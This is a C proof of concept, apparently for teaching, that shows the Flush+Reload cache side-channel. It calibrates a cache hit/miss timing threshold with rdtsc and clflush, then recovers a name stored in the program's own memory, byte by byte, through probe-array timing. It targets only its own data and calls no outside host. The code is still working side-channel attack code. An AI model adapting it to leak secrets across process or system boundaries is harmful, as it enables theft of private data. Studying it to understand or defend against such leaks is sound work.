#include <stdio.h>
#include <stdlib.h>

#include "x86.h"

#define TRIALS (1 << 14)
#define TRAINING_TRIALS (10000)

#define BYTES_TO_LEAK (22)
char memory_to_read[BYTES_TO_LEAK] = {'A', 'l', 'e', 's', 's', 'a', 'n', 'd', 'r', 'o', ' ',
				      'P', 'e', 'l', 'l', 'e', 'g', 'r', 'i', 'n', 'i', '\0'}; //caratteri che si vogliono trovare in cache

unsigned long threshold;

_Alignas(4096) char vector[256 * PAGE_SIZE];


void pre_attack(void)
{
	_Alignas(64) char cache_line;
	int c = 0;
	unsigned long time1, time2;
	unsigned long cumulative_no_flush, cumulative_flush;
	unsigned long average_no_flush = 0, average_flush = 0;

	// Materialize the probe buffer in memory
	for(int i = 0; i < 256 * PAGE_SIZE; i++){ //creo il probing array
		vector[i] = 'x';
	}

	for(int trials = 0; trials < TRAINING_TRIALS; trials++) {
		cumulative_no_flush = 0;
		cumulative_flush = 0;

		c += cache_line;
		for(int i = 0; i < TRIALS; i++) {
			time1 = rdtsc();
			lfence();
			c += cache_line;
			lfence();
			time2 = rdtsc();
			cumulative_no_flush += time2 - time1;
		}
		for(int i = 0; i < TRIALS; i++) {
			clflush(&cache_line);
			time1 = rdtsc();
			lfence();
			c += cache_line;
			lfence();
			time2 = rdtsc();
			cumulative_flush += time2 - time1;
		}

		average_no_flush += cumulative_no_flush / TRIALS;
		average_flush += cumulative_flush / TRIALS;
	}

	average_no_flush = average_no_flush / TRAINING_TRIALS;
	average_flush = average_flush / TRAINING_TRIALS;
	threshold = average_no_flush + ((average_flush - average_no_flush) >> 1);

	printf("Training is over:\n"
	       "\taverage miss time: %lu\n"
	       "\taverage hit time: %lu\n"
	       "\tthreshold: %lu\n", average_flush, average_no_flush, threshold);
}

void read_data_from_cache(void)
{
	int c = 0;
	unsigned long time1, time2;

	for(int i = 0; i < 256; i++) {
		time1 = rdtsc();
		lfence();
		c += vector[i * 4096];
		lfence();
		time2 = rdtsc();
		if((time2 - time1) < threshold) {
			printf("Cache hit at page %d: '%c'\n", i, i);
		}
	}
}

char make_side_effect(char *addr, const char *attack_addr)
{
	return addr[(unsigned long)(*attack_addr) * 4096];
}

int main(void)
{
	printf("*** Flush+Reload POC started***\n");

	pre_attack();

	for(int j = 0; j < BYTES_TO_LEAK; j++) {

		// Prepare the attack address
		char *target_address = &memory_to_read[j];

		// Flush the array from cache
		for(int i = 0; i < 256 * PAGE_SIZE; i += 64) {
			clflush(&vector[i]);
		}
		make_side_effect(vector, target_address);
		read_data_from_cache();
	}
}
